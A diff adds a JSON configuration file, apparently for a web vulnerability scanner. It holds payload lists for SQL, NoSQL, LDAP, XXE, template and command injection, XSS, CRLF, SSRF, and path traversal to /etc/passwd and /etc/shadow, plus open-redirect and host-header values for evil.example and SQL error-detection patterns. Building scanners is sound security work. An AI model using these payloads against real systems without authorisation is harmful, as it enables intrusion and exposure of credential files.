@@ -1,0 +1,215 @@
+{
+  "probes_smoketest": [
+    "' OR '1'='1",
+    "' OR 1=1--",
+    "' OR 1=1#",
+    "' OR 1=1/*",
+    "'/**/OR/**/1=1--",
+    "'/*!50000OR*/1=1--",
+    "'%20OR%201=1--"
+  ],
+  "injection_payloads": {
+    "sql": [
+      "' OR '1'='1",
+      "' OR 1=1--",
+      "\" OR \"\" = \"\"",
+      "' OR 'a'='a",
+      "') OR ('x'='x",
+      "' UNION SELECT null--"
+    ],
+    "xss": [
+      "<script>alert(1)</script>",
+      "<img src=x onerror=alert(1)>",
+      "<svg/onload=alert(1)>"
+    ],
+    "path": [
+      "../../../etc/passwd",
+      "..\\\\..\\\\..\\\\windows\\\\win.ini",
+      "/../../../../boot.ini",
+      "%2e%2e/%2e%2e/%2e%2e/etc/passwd",
+      "..%2f..%2f..%2fetc%2fshadow",
+      "/etc/passwd%00"
+    ],
+    "nosql": [
+      "{\"username\": {\"$ne\": null}, \"password\": {\"$ne\": null}}",
+      "{\"$or\": [{\"admin\": true}, {}]}",
+      "{\"$where\": \"sleep(5000)\"}"
+    ],
+    "ssti": [
+      "{{7*7}}",
+      "${{7*7}}",
+      "<%= 7*7 %>"
+    ],
+    "ldap": [
+      "*)(&(userPassword=*))",
+      "(&(objectClass=*)(uid=*))",
+      "*)%00"
+    ],
+    "xxe": [
+      "<?xml version='1.0'?><!DOCTYPE foo [<!ENTITY xxe SYSTEM 'file:///etc/passwd'>]><foo>&xxe;</foo>",
+      "<!DOCTYPE data [<!ENTITY file SYSTEM 'file:///etc/hosts'>]><data>&file;</data>"
+    ],
+    "cmdi": [
+      ";whoami",
+      "|id",
+      "&nslookup test",
+      "`id`"
+    ],
+    "jsonp": [
+      "callback=alert",
+      "callback=console.log",
+      "jsonp=alert"
+    ]
+  },
+  "crlf_payloads": [
+    "%0d%0aX-Evil: injected",
+    "%0a%0dSet-Cookie: pwned=true",
+    "\\r\\nX-Injected-Header: crlf",
+    "\\r\\nSet-Cookie: session=abc123",
+    "%0d%0aLocation: https://evil.com",
+    "%0d%0aContent-Length: 0"
+  ],
+  "hpp_params": [
+    "id",
+    "q",
+    "search",
+    "filter",
+    "sort",
+    "order",
+    "page",
+    "offset",
+    "limit",
+    "username",
+    "user",
+    "email"
+  ],
+  "ssrf_payloads": [
+    "http://localhost",
+    "http://127.0.0.1",
+    "http://[::1]",
+    "http://localhost.localdomain",
+    "http://0.0.0.0",
+    "http://127.1"
+  ],
+  "sql_error_keywords": [
+    "sql",
+    "query",
+    "database",
+    "unclosed",
+    "quotation",
+    "statement",
+    "expression",
+    "operator",
+    "clause",
+    "unterminated",
+    "malformed",
+    "literal",
+    "aggregate",
+    "identifier",
+    "object",
+    "reference",
+    "function",
+    "type",
+    "cast",
+    "convert",
+    "execution",
+    "plan",
+    "procedure",
+    "transaction",
+    "rollback",
+    "commit",
+    "constraint",
+    "violation",
+    "foreign key",
+    "primary key",
+    "unique constraint",
+    "subquery",
+    "alias",
+    "predicate",
+    "operand",
+    "near",
+    "token",
+    "lexical",
+    "optimizer",
+    "incorrect"
+  ],
+  "nosql_error_keywords": [
+    "mongodb",
+    "mongo",
+    "bson",
+    "e11000 duplicate key",
+    "json parse error",
+    "unrecognized pipeline stage",
+    "bsonobj size must be smaller",
+    "mongo: no documents in result",
+    "cannot apply $inc to a value of non-numeric type",
+    "fieldpath field names may not contain",
+    "mongonetworkerror",
+    "connection timed out",
+    "type mismatch: expected .+ but found",
+    "invalid bson field name",
+    "invalid operator"
+  ],
+  "sql_error_regex": [
+    "column [\\\"\\']?.+?[\\\"\\']? does not exist",
+    "invalid column name [\\\"\\']?.+?[\\\"\\']?",
+    "unknown column [\\\"\\']?.+?[\\\"\\']? in [\\\"\\']?field list[\\\"\\']?",
+    "column [\\\"\\']?.+?[\\\"\\']? (?:is|must be) of type .+? but expression is of type",
+    "relation [\\\"\\']?.+?[\\\"\\']? does not exist",
+    "invalid (?:object|table) name [\\\"\\']?.+?[\\\"\\']?",
+    "table [\\\"\\']?.+?[\\\"\\']? doesn't exist",
+    "no such table: [\\\"\\']?.+?[\\\"\\']?",
+    "table [\\\"\\']?.+?[\\\"\\']? has no column named [\\\"\\']?.+?[\\\"\\']?",
+    "unterminated quoted string",
+    "incorrect syntax near [\\\"\\']?.+?[\\\"\\']?",
+    "unexpected token: .+? at position \\d+",
+    "expecting (.+?), found (.+?)",
+    "missing (.+?) at (.+?)",
+    "extraneous input [\\\"\\']?.+?[\\\"\\']? expecting",
+    "syntax error at or near [\\\"\\']?.+?[\\\"\\']?",
+    "unexpected end of SQL command",
+    "invalid input syntax for type .+?: [\\\"\\']?.+?[\\\"\\']?",
+    "could not convert .+? to .+?",
+    "conversion failed when converting .+? to data type .+?"
+  ],
+  "graphql_introspection_query": "query IntrospectionQuery { __schema { queryType { name } mutationType { name } subscriptionType { name } types { kind name } directives { name description locations args { name description type { kind name } defaultValue } } } }",
+  "graphql_extra_queries": [
+    "query { __typename }"
+  ],
+  "directory_traversal_payloads": [
+    "././{FILE}",
+    "./././{FILE}",
+    "./",
+    "././",
+    "./././",
+    "././././"
+  ],
+  "directory_traversal_files": [
+    "/etc/passwd",
+    "/proc/self/environ",
+    "/etc/hosts"
+  ],
+  "open_redirect_payloads": [
+    "https://evil.example",
+    "//evil.example",
+    "///evil.example",
+    "https:%2f%2fevil.example",
+    "https%3a%2f%2fevil.example"
+  ],
+  "host_header_payloads": [
+    "evil.example",
+    "evil.example:443",
+    "127.0.0.1"
+  ],
+  "forwarded_header_sets": [
+    {
+      "X-Forwarded-Host": "evil.example"
+    },
+    {
+      "X-Forwarded-Proto": "http"
+    },
+    {
+      "X-Forwarded-For": "127.0.0.1"
+    }
+  ]
+}
